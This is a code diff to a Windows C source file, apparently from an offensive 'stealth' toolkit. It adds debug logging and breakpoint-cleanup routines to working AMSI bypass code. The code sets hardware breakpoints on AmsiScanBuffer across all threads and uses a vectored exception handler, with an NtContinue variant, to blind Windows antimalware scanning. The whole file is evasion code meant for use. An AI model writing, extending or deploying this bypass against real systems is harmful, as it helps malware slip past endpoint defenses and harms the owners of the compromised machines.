@@ -17,6 +17,7 @@
 #include <winternl.h>
 #include <stdio.h>
 #include "stealth.h"
+#include "stealth_utils.h"
 
 // ================================================================
 // Globals
@@ -85,6 +86,7 @@ BOOL SetHardwareBreakpointOnThread(HANDLE hThread, PVOID address)
     // Get current thread context
     if (!GetThreadContext(hThread, &ctx))
     {
+        Stealth_DebugLastErrorA("GetThreadContext");
         return FALSE;
     }
 
@@ -100,6 +102,7 @@ BOOL SetHardwareBreakpointOnThread(HANDLE hThread, PVOID address)
     // Set modified context
     if (!SetThreadContext(hThread, &ctx))
     {
+        Stealth_DebugLastErrorA("SetThreadContext");
         return FALSE;
     }
 
@@ -150,7 +153,15 @@ BOOL SetHardwareBreakpointAllThreads(PVOID address)
                     {
                         threadsPatched++;
                     }
+                    else
+                    {
+                        Stealth_DebugPrintfA("Failed to arm hardware breakpoint for thread %lu", te32.th32ThreadID);
+                    }
                     CloseHandle(hThread);
+                }
+                else
+                {
+                    Stealth_DebugLastErrorA("OpenThread");
                 }
             }
         } while (Thread32Next(hSnapshot, &te32));
@@ -164,8 +175,77 @@ BOOL SetHardwareBreakpointAllThreads(PVOID address)
     {
         threadsPatched++;
     }
+    else
+    {
+        Stealth_DebugPrintfA("Failed to arm hardware breakpoint for current thread");
+    }
 
     return (threadsPatched > 0);
+}
+
+static BOOL ClearHardwareBreakpointOnThread(HANDLE hThread)
+{
+    CONTEXT ctx = {0};
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+    if (!GetThreadContext(hThread, &ctx))
+    {
+        Stealth_DebugLastErrorA("GetThreadContext/clear");
+        return FALSE;
+    }
+
+    ctx.Dr0 = 0;
+    ctx.Dr7 &= ~(1UL << 0);
+    ctx.Dr7 &= ~(3UL << 16);  // clear DR0 condition bits
+    ctx.Dr7 &= ~(3UL << 18);  // clear DR0 size bits
+
+    if (!SetThreadContext(hThread, &ctx))
+    {
+        Stealth_DebugLastErrorA("SetThreadContext/clear");
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static void ClearHardwareBreakpointAllThreads(void)
+{
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    DWORD currentPid = GetCurrentProcessId();
+    DWORD currentTid = GetCurrentThreadId();
+
+    if (hSnapshot == INVALID_HANDLE_VALUE)
+    {
+        return;
+    }
+
+    THREADENTRY32 te32;
+    te32.dwSize = sizeof(THREADENTRY32);
+    if (Thread32First(hSnapshot, &te32))
+    {
+        do
+        {
+            if (te32.th32OwnerProcessID == currentPid)
+            {
+                HANDLE hThread = NULL;
+                if (te32.th32ThreadID == currentTid)
+                {
+                    hThread = GetCurrentThread();
+                    ClearHardwareBreakpointOnThread(hThread);
+                }
+                else
+                {
+                    hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
+                    if (hThread)
+                    {
+                        ClearHardwareBreakpointOnThread(hThread);
+                        CloseHandle(hThread);
+                    }
+                }
+            }
+        } while (Thread32Next(hSnapshot, &te32));
+    }
+
+    CloseHandle(hSnapshot);
 }
 
 // ================================================================
@@ -178,6 +258,7 @@ BOOL Stealth_PatchAMSI_HardwareBreakpoint(void)
 
     if (g_AmsiBypassActive)
     {
+        Stealth_DebugPrintfA("AMSI hardware breakpoint already active");
         return TRUE;  // Already active
     }
 
@@ -185,6 +266,7 @@ BOOL Stealth_PatchAMSI_HardwareBreakpoint(void)
     hAmsi = LoadLibraryW(L"amsi.dll");
     if (!hAmsi)
     {
+        Stealth_DebugPrintfA("LoadLibraryW(amsi.dll) failed, bypass not required (error %lu)", GetLastError());
         // AMSI not loaded - bypass not needed
         return TRUE;
     }
@@ -193,6 +275,7 @@ BOOL Stealth_PatchAMSI_HardwareBreakpoint(void)
     g_AmsiScanBufferAddress = (PVOID)GetProcAddress(hAmsi, "AmsiScanBuffer");
     if (!g_AmsiScanBufferAddress)
     {
+        Stealth_DebugPrintfA("AmsiScanBuffer export not found");
         FreeLibrary(hAmsi);
         return FALSE;
     }
@@ -201,6 +284,7 @@ BOOL Stealth_PatchAMSI_HardwareBreakpoint(void)
     g_VehHandle = AddVectoredExceptionHandler(1, AmsiHardwareBreakpointHandler);
     if (!g_VehHandle)
     {
+        Stealth_DebugLastErrorA("AddVectoredExceptionHandler");
         FreeLibrary(hAmsi);
         return FALSE;
     }
@@ -211,10 +295,12 @@ BOOL Stealth_PatchAMSI_HardwareBreakpoint(void)
         RemoveVectoredExceptionHandler(g_VehHandle);
         g_VehHandle = NULL;
         FreeLibrary(hAmsi);
+        Stealth_DebugPrintfA("Failed to set hardware breakpoint across threads");
         return FALSE;
     }
 
     g_AmsiBypassActive = TRUE;
+    Stealth_DebugPrintfA("AMSI hardware breakpoint active at %p", g_AmsiScanBufferAddress);
 
     // Keep amsi.dll loaded (don't FreeLibrary)
     return TRUE;
@@ -232,6 +318,8 @@ VOID Stealth_CleanupAMSIBypass(void)
         g_VehHandle = NULL;
     }
 
+    ClearHardwareBreakpointAllThreads();
+    g_AmsiScanBufferAddress = NULL;
     g_AmsiBypassActive = FALSE;
 }
 
@@ -257,24 +345,28 @@ BOOL Stealth_PatchAMSI_NtContinue(void)
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (!hNtdll)
     {
+        Stealth_DebugPrintfA("GetModuleHandle(ntdll) failed");
         return FALSE;
     }
 
     NtContinue_t pNtContinue = (NtContinue_t)GetProcAddress(hNtdll, "NtContinue");
     if (!pNtContinue)
     {
+        Stealth_DebugPrintfA("NtContinue export not available");
         return FALSE;
     }
 
     HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
     if (!hAmsi)
     {
+        Stealth_DebugPrintfA("amsi.dll not loaded; bypass unnecessary");
         return TRUE;  // Not loaded
     }
 
     g_AmsiScanBufferAddress = (PVOID)GetProcAddress(hAmsi, "AmsiScanBuffer");
     if (!g_AmsiScanBufferAddress)
     {
+        Stealth_DebugPrintfA("AmsiScanBuffer export missing for NtContinue path");
         return FALSE;
     }
 
@@ -282,6 +374,7 @@ BOOL Stealth_PatchAMSI_NtContinue(void)
     g_VehHandle = AddVectoredExceptionHandler(1, AmsiHardwareBreakpointHandler);
     if (!g_VehHandle)
     {
+        Stealth_DebugLastErrorA("AddVectoredExceptionHandler (NtContinue)");
         return FALSE;
     }
 
@@ -293,6 +386,7 @@ BOOL Stealth_PatchAMSI_NtContinue(void)
     HANDLE hCurrentThread = GetCurrentThread();
     if (!GetThreadContext(hCurrentThread, &ctx))
     {
+        Stealth_DebugLastErrorA("GetThreadContext (NtContinue)");
         RemoveVectoredExceptionHandler(g_VehHandle);
         return FALSE;
     }
@@ -307,9 +401,11 @@ BOOL Stealth_PatchAMSI_NtContinue(void)
     if (NT_SUCCESS(status))
     {
         g_AmsiBypassActive = TRUE;
+        Stealth_DebugPrintfA("AMSI NtContinue bypass active at %p", g_AmsiScanBufferAddress);
         return TRUE;
     }
 
+    Stealth_DebugPrintfA("NtContinue returned 0x%08X", status);
     RemoveVectoredExceptionHandler(g_VehHandle);
     g_VehHandle = NULL;
     return FALSE;
